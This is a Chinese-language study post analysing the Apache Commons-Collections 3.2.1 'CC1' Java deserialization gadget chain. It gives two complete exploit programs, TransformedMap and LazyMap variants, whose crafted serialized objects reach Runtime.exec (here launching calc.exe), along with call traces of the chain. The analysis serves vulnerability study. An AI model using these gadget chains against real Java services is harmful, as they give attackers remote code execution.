---
title: CC1链
date: 2026-03-22
updated: 2026-03-22
tags:
  - 链子
categories:
  - 链子
description: CC1链
published: true
---
JDK < 8u71，commons-collections:3.2.1

```xml
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
</dependencies>
```

## TransformedMap

根据已知 Payload，进行正向分析

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * CC1 漏洞复现
 * 核心原理：利用 AnnotationInvocationHandler 在 readObject 时会调用 Map.Entry.setValue() 的特性，
 * 触发 TransformedMap 的转换逻辑，最终通过反射链执行系统命令。
 */
public class CC1TranformedMapExp {
    public static void main(String[] args) throws Exception {

        // 1. 构造 Sink（命令执行链）
        Transformer[] transformers = new Transformer[]{
                // 1. 返回 Runtime.class
                // Runtime对象本身不支持序列化，不能直接传实例，只能传 Runtime.class，然后利用反射在目标服务器上“现场生成”一个实例
                new ConstantTransformer(Runtime.class),
                // 2. 通过反射获取 Runtime.getRuntime 方法对象
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                // 3. 反射调用 getRuntime() 方法，获得真实的 Runtime 实例对象
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                // 4. 调用 Runtime 实例的 exec 方法，执行计算器程序
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };

        // 将多个 Transformer 串成一条执行链
        // 调用 transform() 时会按顺序执行上面的每一步
        Transformer transformerChain = new ChainedTransformer(transformers);


        // 2. 构造 Gadget（触发链）
        // 目标：找到一个“在特定操作下会自动调用 transform()”的结构
        // 将恶意动作包装进一个 Map 中，等待被触发
        Map<String, Object> innerMap = new HashMap<>();
        // 关键点：Key 必须为 "value"。
        // 因为 AnnotationInvocationHandler 会检查 Map 的 Key 是否在注解（Target.class）中存在方法名，即只会处理key="value" 的 Entry 调用 transform()
        innerMap.put("value", "xxxx");

        // 使用 TransformedMap 装饰原始 HashMap
        // 当调用 Map.Entry.setValue() 时，会自动触发 transformerChain.transform()
        // 即一旦这个 Map 的内容被修改（调用 setValue），它就会自动触发绑定的 Transformer
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        // 3. 构造 Entry（反序列化入口）
        // 目标：找一个类，在 readObject() 时会触发 setValue()

        // 反射获取 AnnotationInvocationHandler 类
        // 该类没有 public 构造方法，所以必须通过反射强行获取
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        // 实例化该类：传入 Target.class 注解和特制的 outerMap
        // Target.class 是一个自带 "value()" 方法的注解，能通过 readObject 里的合法性检查。
        Object instance = construct.newInstance(Target.class, outerMap);

        byte[] data = serialize(instance);
        System.out.println("序列化完成，准备触发反序列化...");

        // 反序列化时，会调用 AnnotationInvocationHandler.readObject()
        unserialize(data);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

`TransformerMap` 当尝试向里面添加新元素（`put`）或者修改已有元素（`setValue`）时，它会自动调用绑定的 `Transformer` 对传入的数据进行加工。

`AnnotationInvocationHandler` 在反序列化时，会遍历内部的 `memberValues`（即构造的恶意 Map）。如果发现 Map 里的某个 `key`，恰好是目标注解里的一个属性名，它就会执行 `memberValue.setValue(...)` 去修改这个值。

`AnnotationType.getInstance(type)` 这里的 type 为构造方法里传入的 `Target.class`。memberTypes 获取到注解类型的所有方法，并循环遍历 memberValues 这个 Map，随后会调用 `setValue()`

memberValues 即构造的 outerMap（TransformedMap 实例）。

![[attachments/20260322.png]]

跟进会调用 `checkSetValue()`，parent 是 TransformedMap 实例

![[attachments/20260322-1.png]]

进入后，随后会调用 `transform()` 方法，valueTransformer 就是我们构造的 transformerChain

![[attachments/20260322-2.png]]

随后会循环调用，依次执行构造的 4 个 Transformer

![[attachments/20260322-3.png]]

忽略输入，直接返回构造时传入的常量，即返回 `Runtime.class`

![[attachments/20260322-4.png]]

InvokerTransformer 中通过反射来触发调用

1. input 是 Runtime.class，反射调用 `Runtime.class.getMethod("getRuntime", new Class[0])`，返回 Method 对象；
2. input 是上一步返回的 Method 对象，反射调用：`getRuntimeMethod.invoke(null, null)`，返回 `Runtime.getRuntime()` 的调用结果 → Runtime 实例；
3. input 是 Runtime 实例，反射调用：`runtime.exec("calc.exe")`，弹出计算器。

![[attachments/20260322-5.png]]

反射调用执行命令

```java
Class.forName("java.lang.Runtime")
	.getMethod("exec",String.class)
	.invoke(Class.forName("java.lang.Runtime")
	.getMethod("getRuntime")
	.invoke(
		Class.forName("java.lang.Runtime"),
		"calc.exe"
		)
```

对应到 InvokerTransformer.transform

```java
// Object input
input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
this.iMethodName = "exec"; 
this.iParamTypes = String.class;
this.iArgs = "calc.exe";
```

```
ois.readObject() <=> ObjectInputStream.readObject()
AnnotationInvocationHandler::readObject()
	->AbstracInputCheckedMapDecorator::setValue()
	->TransformedMap::checkSetValue()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InvokerTransformer::transform()
```

### 反向

> - 目标 - 命令执行
> 	- `Runtime.exec("calc.exe")`
> 	- 如何在不直接调用 `Runtime.exec()` 的情况下执行它
> - 找到能反射调用 exec 的组件
> 	- `InvokerTransformer` 可以通过反射调用任意对象的方法，包括 `exec`
> - 谁调用了 `InvokerTransformer.transform()`
> 	- `ChainedTransformer` 会依次调用内部的 Transformer
> - 谁调用了 `ChainedTransformer.transform()`
> 	- `TransformedMap.checkSetValue()` 会调用 `valueTransformer.transform()`
> - 谁调用了 `TransformedMap.checkSetValue()`
> 	- 任何对 `TransformedMap` 的 Entry 调用 `setValue` 都会触发 `checkSetValue`
> - 谁会在反序列化时自动调用 Map 的 setValue
> 	- `AnnotationInvocationHandler.readObject()` 会遍历 `memberValues` 并调用每个 Entry 的 `setValue`
> - AnnotationInvocationHandler 的 memberValues 能否控制
> 	- 可以通过反射将 `memberValues` 设置为自己的 `TransformedMap`，并且传入一个特定的注解类（如 `Target.class`）来通过合法性检查
> - 反序列化入口
> 	- 当反序列化 `AnnotationInvocationHandler` 实例时，会自动调用其 `readObject` 方法

## LazyMap

根据已知 Payload，进行正向分析

循环中后面会调用 value 的某些方法，但这里的 value 是我们传入的 mapProxy 对象

![[attachments/20260322-6.png]]

![[attachments/20260322-7.png]]

![[attachments/20260322-8.png]]

当 `AnnotationInvocationHandler.readObject()` 中调用 `memberValue.getValue()` 时，由于 memberValue 是代理对象，强行转交给代理的处理器（恰好也是另一个 `AnnotationInvocationHandler` 实例）的 `invoke()`

在 `invoke()` 方法的逻辑中，它会尝试去内部真正的 Map 中获取被调用的方法名对应的值。

 `AnnotationInvocationHandler.readObject()` 的逻辑是如果调用的是 toString、hashCode、annotationType 等方法，直接处理，其他的会调用 `memberValues.get(member)`，这里的 `memberValues` 才是真正的 `LazyMap` 对象

![[attachments/20260322-9.png]]

跟进进入 `LazyMap.get()`，如果 key 不存在，就调用 `factory.transform()`，`factory` 即我们构造的 `transformerChain`

![[attachments/20260322-10.png]]

后面的和上面就一样了

> - 为什么要动态代理？
> 
> `AnnotationInvocationHandler` 的 `readObject` 方法，它会去调用内部属性 `memberValues` 的 `entrySet()` 方法。而在 `LazyMap` 版本中，目标是触发 `LazyMap.get()`。如果直接把 `LazyMap` 赋值给 `memberValues`，那么 `readObject` 执行的是 `LazyMap.entrySet()`，这并不会触发 `get()` 方法，链条在这里就断了。
> 
> - 怎么把 `entrySet()` 的调用“扭转”成 `get()` 的调用
> 
> Java 中，如果为一个接口创建了动态代理对象，那么无论调用该代理对象的什么方法，这个调用都会被拦截，统一交给 `InvocationHandler` 的处理器的 `invoke` 方法来处理
> 
> **`AnnotationInvocationHandler` 这个类不仅重写了 `readObject`，它本身也是一个 `InvocationHandler`。而且它的 `invoke` 方法中，恰好有一段调用了内部 `memberValues.get(member)` 的代码**

链条构造：

- 最内层： 构造好带有恶意 `Transformer` 链的 `LazyMap`。
- 中间层（代理处理）： 实例化一个 `AnnotationInvocationHandler`（暂称为 Handler1），把 `LazyMap` 塞进它的 `memberValues` 里。
- 代理层： 创建一个 `Map` 接口的动态代理对象，并且指定它的处理器为 Handler1。  
- 最外层（入口）： 再实例化一个 `AnnotationInvocationHandler`（暂称为 Handler2），把刚才创建的代理对象塞进它的 `memberValues` 里

反序列化过程：

Handler2 进行反序列化 -> 调用代理对象的 `entrySet()` -> 被拦截，交给 Handler1 的 `invoke()` 处理 -> Handler1 执行 `memberValues.get("entrySet")` -> 这里的 `memberValues` 正是 `LazyMap` -> 触发 `LazyMap.get()` -> 执行恶意命令

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMapExp {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                // 1. 传入 Runtime.class
                new ConstantTransformer(Runtime.class),
                // 2. 通过反射调用 getMethod 获取 getRuntime 方法
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // 3. 通过反射调用 invoke 执行 getRuntime 方法，拿到 Runtime 实例化对象
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                // 4. 通过反射调用 exec 方法执行系统命令，这里以打开计算器为例
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        // 将上述的 Transformer 组合成一个链条
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 构造 LazyMap
        // 当 LazyMap.get() 被调用，且找不到 key 时，就会触发 transformerChain
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);


        // 利用动态代理，将“任意方法的调用”转换成对 LazyMap 的 get() 调用，即将 readObject 的执行流导向 LazyMap.get()

        // 1. 获取 AnnotationInvocationHandler 的构造函数 (因为它是私有的，需要反射)
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        // 2. 构造 Handler1 (理解为炸弹载体)，创建一个 AnnotationInvocationHandler 实例，里面装着你的恶意 lazyMap
        // 注意：第一个参数需要传入一个注解的 Class 对象，Retention.class 比较常用
        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);
		// 这个 handler1 本身还不具备攻击性，它只是一个“逻辑处理器”。它的逻辑是：“只要有人调我的方法，我就去那个 Map 里查一查。”

        // 3. 为 Map 接口创建动态代理对象，使用 handler1 来处理代理对象的所有方法调用
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(), // 类加载器
                new Class[]{Map.class},     // 代理需要实现的接口
                handler1                    // 处理调用的 InvocationHandler
        );

        // 4. 构造 Handler2 (入口，内部包裹着代理对象)
        // 当 Handler2 被反序列化时，会调用 proxyMap.entrySet()，从而引爆整个链条
        InvocationHandler handler2 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);


        // 序列化：将构造好的恶意对象写入文件 (这里写到内存中模拟)
        byte[] data = serialize(handler2);
        System.out.println("序列化完成，准备触发反序列化...");

        // 反序列化：从内存中读取字节流并反序列化，触发漏洞
        unserialize(data);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

```
ois.readObject() <=> ObjectInputStream.readObject()
AnnotationInvocationHandler::readObject()
	->Map(Proxy)::entrySet()
	->AnnotationInvocationHandler::invoke()
	->LazyMap::get()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InvokerTransformer::transform()
```

### 反向

> - ...
> - 谁调用了 `ChainedTransformer.transform()`
> 	- 当对 LazyMap 调用 `get` 方法且 key 不存在时，会触发 `factory.transform()`
> - 谁会在反序列化时自动调用 `LazyMap.get()`
> 	- 当通过动态代理调用某个方法时，会触发 `memberValues.get()`
> - 谁会在反序列化时触发动态代理
> 	- 当 `memberValues` 是一个动态代理对象时，在 `readObject` 中对它进行操作就会触发代理的 `invoke` 方法
> - 如何让 memberValues 成为代理对象
> 	- 通过两层包装：
> 		- 第一层：`lazyMap` 被包装在 `AnnotationInvocationHandler` 中，形成 `handler`  
> 		- 第二层：`handler` 被包装成 `Map` 的动态代理 `mapProxy`    
> 		- 第三层：`mapProxy` 再次被包装成 `finalHandler` 的 `memberValues`
> - 反序列化入口
> 	- `ois.readObject()`  反序列化 finalHandler

## PS：

> 由于 IDEA Debug 时 Variables 面板为了能看到各个变量的当前状态，会后台默认静默调用一些方法获取值并渲染，调试时 Payload 会被提权触发。这里得先关掉 Debug 中的两个选项：
> 
> - Enable 'toString()' object view
> - Enable alternative view for Collections classes

> commons collections 源码下载地址 https://archive.apache.org/dist/commons/collections/
